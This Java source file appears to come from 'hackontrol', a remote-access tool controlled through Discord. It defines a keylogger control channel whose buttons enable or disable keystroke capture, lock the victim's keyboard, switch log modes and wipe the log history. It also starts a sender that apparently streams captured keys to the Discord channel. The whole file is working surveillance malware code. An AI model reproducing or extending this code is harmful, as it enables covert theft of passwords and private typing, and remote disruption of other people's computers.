package com.khopan.hackontrol.channel.keylogger;

import java.util.List;

import com.khopan.hackontrol.HackontrolChannel;
import com.khopan.hackontrol.NativeLibrary;
import com.khopan.hackontrol.manager.interaction.ButtonContext;
import com.khopan.hackontrol.manager.interaction.ButtonManager;
import com.khopan.hackontrol.manager.interaction.ButtonManager.ButtonType;
import com.khopan.hackontrol.manager.interaction.InteractionManager;
import com.khopan.hackontrol.manager.interaction.Question;
import com.khopan.hackontrol.manager.interaction.Question.QuestionType;
import com.khopan.hackontrol.registry.Registry;
import com.khopan.hackontrol.utils.HackontrolMessage;

import net.dv8tion.jda.api.entities.Message;
import net.dv8tion.jda.api.entities.MessageHistory;
import net.dv8tion.jda.api.entities.channel.middleman.MessageChannel;
import net.dv8tion.jda.api.interactions.components.ActionRow;
import net.dv8tion.jda.api.interactions.components.buttons.Button;

public class KeyLoggerChannel extends HackontrolChannel {
	private static final String CHANNEL_NAME = "keylogger";

	static boolean RawKeyMode;

	private static final Button BUTTON_ENABLE          = ButtonManager.staticButton(ButtonType.SUCCESS, "Enable",          "enableKeyLogger");
	private static final Button BUTTON_DISABLE         = ButtonManager.staticButton(ButtonType.DANGER,  "Disable",         "disableKeyLogger");

	private static final Button BUTTON_LOCK_KEYBOARD   = ButtonManager.staticButton(ButtonType.SUCCESS, "Lock Keyboard",   "lockKeyboard");
	private static final Button BUTTON_UNLOCK_KEYBOARD = ButtonManager.staticButton(ButtonType.DANGER,  "Unlock Keyboard", "unlockKeyboard");

	private static final Button BUTTON_RAW_KEY_MODE    = ButtonManager.staticButton(ButtonType.SUCCESS, "Raw Key Mode",    "rawKeyMode");
	private static final Button BUTTON_TEXT_MODE       = ButtonManager.staticButton(ButtonType.SUCCESS, "Text Mode",       "textMode");

	private static final Button BUTTON_CLEAR           = ButtonManager.staticButton(ButtonType.DANGER,  "Clear",           "keyloggerClear");

	@Override
	public String getName() {
		return KeyLoggerChannel.CHANNEL_NAME;
	}

	@Override
	public void preInitialize(Registry registry) {
		registry.register(InteractionManager.BUTTON_REGISTRY, KeyLoggerChannel.BUTTON_ENABLE,          context -> this.buttonEnable(context, true));
		registry.register(InteractionManager.BUTTON_REGISTRY, KeyLoggerChannel.BUTTON_DISABLE,         context -> this.buttonEnable(context, false));
		registry.register(InteractionManager.BUTTON_REGISTRY, KeyLoggerChannel.BUTTON_LOCK_KEYBOARD,   context -> this.buttonLock(context, true));
		registry.register(InteractionManager.BUTTON_REGISTRY, KeyLoggerChannel.BUTTON_UNLOCK_KEYBOARD, context -> this.buttonLock(context, false));
		registry.register(InteractionManager.BUTTON_REGISTRY, KeyLoggerChannel.BUTTON_RAW_KEY_MODE,    context -> this.buttonRawKeyMode(context, true));
		registry.register(InteractionManager.BUTTON_REGISTRY, KeyLoggerChannel.BUTTON_TEXT_MODE,       context -> this.buttonRawKeyMode(context, false));
		registry.register(InteractionManager.BUTTON_REGISTRY, KeyLoggerChannel.BUTTON_CLEAR,           this :: buttonClear);
	}

	@Override
	public void initialize() {
		this.channel.sendMessageComponents(ActionRow.of(KeyLoggerChannel.BUTTON_ENABLE, KeyLoggerChannel.BUTTON_DISABLE), ActionRow.of(KeyLoggerChannel.BUTTON_LOCK_KEYBOARD, KeyLoggerChannel.BUTTON_UNLOCK_KEYBOARD), ActionRow.of(KeyLoggerChannel.BUTTON_RAW_KEY_MODE, KeyLoggerChannel.BUTTON_TEXT_MODE, KeyLoggerChannel.BUTTON_CLEAR)).queue();
	}

	@Override
	public void postInitialize() {
		KeyLogSender.start(this.channel);
	}

	private void buttonEnable(ButtonContext context, boolean enable) {
		if(NativeLibrary.Enable == enable) {
			HackontrolMessage.boldDeletable(context.reply(), "KeyLogger is already " + (enable ? "enabled" : "disabled"));
			return;
		}

		if(enable) {
			NativeLibrary.Enable = enable;
			context.deferEdit().queue();
			return;
		}

		Question.positive(context.reply(), "Are you sure you want to disable KeyLogger?", QuestionType.YES_NO, () -> NativeLibrary.Enable = false);
	}

	private void buttonLock(ButtonContext context, boolean lock) {
		if(NativeLibrary.Block == lock) {
			HackontrolMessage.boldDeletable(context.reply(), "Keyboard is already " + (lock ? "locked" : "unlocked"));
			return;
		}

		if(lock) {
			NativeLibrary.Block = lock;
			context.deferEdit().queue();
			return;
		}

		Question.positive(context.reply(), "Are you sure you want to unlock the keyboard?", QuestionType.YES_NO, () -> NativeLibrary.Block = false);
	}

	private void buttonRawKeyMode(ButtonContext context, boolean rawKeyMode) {
		if(KeyLoggerChannel.RawKeyMode == rawKeyMode) {
			HackontrolMessage.boldDeletable(context.reply(), (rawKeyMode ? "Raw key" : "Text") + " mode is already enabled");
			return;
		}

		KeyLoggerChannel.RawKeyMode = rawKeyMode;
		context.deferEdit().queue();
	}

	private void buttonClear(ButtonContext context) {
		long identifier = context.getMessageIdLong();
		MessageChannel channel = context.getChannel();
		Question.positive(context.reply(), "Are you sure you want to clear the KeyLog information?", QuestionType.YES_NO, () -> {
			MessageHistory.getHistoryFromBeginning(channel).queue(history -> {
				List<Message> list = history.getRetrievedHistory();

				for(int i = 0; i < list.size(); i++) {
					Message message = list.get(i);

					if(message.getIdLong() != identifier) {
						message.delete().queue();
					}
				}
			});
		});
	}
}
